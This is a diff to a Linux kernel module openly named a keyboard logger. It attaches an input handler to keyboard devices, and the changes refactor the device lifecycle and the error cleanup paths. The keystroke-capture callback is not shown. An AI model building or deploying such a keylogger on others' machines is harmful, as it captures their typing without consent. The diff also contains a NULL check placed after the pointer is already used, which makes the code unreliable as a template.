@@ -29,7 +29,6 @@
 #include <linux/cdev.h>
 #include <linux/kobject.h>
 #include <linux/time.h>
-#include <linux/pci.h>
 #include <linux/platform_device.h>
 #include <linux/uaccess.h>
 #include <linux/major.h>
@@ -48,32 +47,34 @@ MODULE_DESCRIPTION("Input driver keyboard logger");
 
 const char *kbdstr = "keyboard";
 
-struct kbdloggerdev {
+struct klogdev {
 	struct input_handle handle;
 	struct device dev;
-	struct cdev   cdev;
 };
-
-struct kbdloggerdev *kldev;
 
 static const struct file_operations kldev_fops = {
 	.owner    = THIS_MODULE,
 };
 
 
-static void kldev_release(struct device *dev)
+static void klogdev_free(struct device *dev)
 {
+	struct klogdev *kldev = container_of(dev, struct klogdev, dev);
+
+	input_put_device(kldev->handle.dev);
+	kfree(kldev);
 }
 
-static void kbdlogger_cleanup(void)
+static void kbdlogger_cleanup(struct klogdev *kldev)
 {
-	cdev_del(&kldev->cdev);
-	device_del(&kldev->dev);
-	input_close_device(&kldev->handle);
-	input_free_minor(MINOR(kldev->dev.devt));
-	input_unregister_handle(&kldev->handle);
-	put_device(&kldev->dev);
-	kfree(kldev);
+	struct input_handle *handle = &kldev->handle;
+	if (!kldev)
+		return;
+
+	if (handle)
+		input_close_device(handle);
+	else
+		pr_err("input device already NULL\n");
 }
 
 static int kbdlogger_connect(struct input_handler *handler,
@@ -82,6 +83,7 @@ static int kbdlogger_connect(struct input_handler *handler,
 	int error;
 	int minor;
 	int dev_no;
+	struct klogdev *kldev;
 
 	/* if the device is not a keyboard it is filtered out. */
 	if (!strstr(dev->name, kbdstr))
@@ -94,7 +96,7 @@ static int kbdlogger_connect(struct input_handler *handler,
 		return error;
 	}
 
-	kldev = kzalloc(sizeof(struct kbdloggerdev), GFP_KERNEL);
+	kldev = kzalloc(sizeof(struct klogdev), GFP_KERNEL);
 	if (!kldev) {
 		error = -ENOMEM;
 		goto err_free_minor;
@@ -106,30 +108,21 @@ static int kbdlogger_connect(struct input_handler *handler,
 		dev_no -= EVDEV_MINOR_BASE;
 	dev_set_name(&kldev->dev, "event%d", dev_no);
 
-	kldev->handle.dev = dev;
+	kldev->handle.dev = input_get_device(dev);  /* input_dev */
+	kldev->handle.name = dev_name(&kldev->dev);
 	kldev->handle.handler = handler;
-	kldev->handle.name = "kbdlogger_handle";
 	kldev->handle.private = kldev;
 
 	kldev->dev.devt = MKDEV(INPUT_MAJOR, minor);
 	kldev->dev.class = &input_class;
-	kldev->dev.parent = &dev->dev;
-	kldev->dev.release = kldev_release;
+	kldev->dev.parent = &dev->dev; /* &(input_dev)->dev */
+	kldev->dev.release = klogdev_free;
 	device_initialize(&kldev->dev);
 
 	error = input_register_handle(&kldev->handle);
 	if (error)
-		goto err_cleanup_kldev;
+		goto err_free_kldev;
 
-	/* char device setup (struct cdev) */
-	cdev_init(&kldev->cdev, &kldev_fops);
-	kldev->cdev.kobj.parent = &kldev->dev.kobj;
-	error = cdev_add(&kldev->cdev, kldev->dev.devt, 1);
-	if (error)
-		goto err_cleanup_kldev;
-
-
-	/* device registering */
 	error = device_add(&kldev->dev);
 	if (error)
 		goto err_cleanup_kldev;
@@ -145,11 +138,14 @@ static int kbdlogger_connect(struct input_handler *handler,
 
 	return 0;
 
+err_cleanup_kldev:
+	kbdlogger_cleanup(kldev);
+//err_unregister_handle:
+	input_unregister_handle(&kldev->handle);
+err_free_kldev:
+	put_device(&kldev->dev);
 err_free_minor:
 	input_free_minor(minor);
-	return error;
-err_cleanup_kldev:
-	kbdlogger_cleanup();
 	return error;
 }
 
@@ -164,9 +160,20 @@ static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 
 static void kbdlogger_disconnect(struct input_handle *handle)
 {
-	pr_info("Disconnected device: %s\n",
-		dev_name(&handle->dev->dev));
-	kbdlogger_cleanup();
+	struct klogdev *kldev = handle->private;
+
+	device_del(&kldev->dev);
+	pr_info("Disconnected device: %s\n", dev_name(&handle->dev->dev));
+	kbdlogger_cleanup(kldev);
+
+	input_free_minor(MINOR(kldev->dev.devt));
+
+	if (handle)
+		input_unregister_handle(handle);
+	else
+		pr_err("input handle already NULL\n");
+
+	put_device(&kldev->dev);
 }
 
 static const struct input_device_id kbdlogger_ids[] = {
@@ -177,13 +184,13 @@ static const struct input_device_id kbdlogger_ids[] = {
 MODULE_DEVICE_TABLE(input, kbdlogger_ids);
 
 static struct input_handler kbdlogger_handler = {
-	.connect    = kbdlogger_connect,
-	.disconnect = kbdlogger_disconnect,
-	.event      = kbdlogger_event,
-	.id_table   = kbdlogger_ids,
-	.name       = "kbdlogger_handler",
+	.connect       = kbdlogger_connect,
+	.disconnect    = kbdlogger_disconnect,
+	.event         = kbdlogger_event,
+	.id_table      = kbdlogger_ids,
+	.legacy_minors = true,
+	.name          = "kbdlogger_handler",
 };
-
 
 static int __init kbdlogger_init(void)
 {
@@ -198,10 +205,9 @@ static int __init kbdlogger_init(void)
 	pr_info("loaded\n");
 	return 0;
 fail:
-	kbdlogger_cleanup();
+	pr_err("failed to init %s\n", DEVNAME);
 	return err;
 }
-
 
 static void __exit kbdlogger_exit(void)
 {
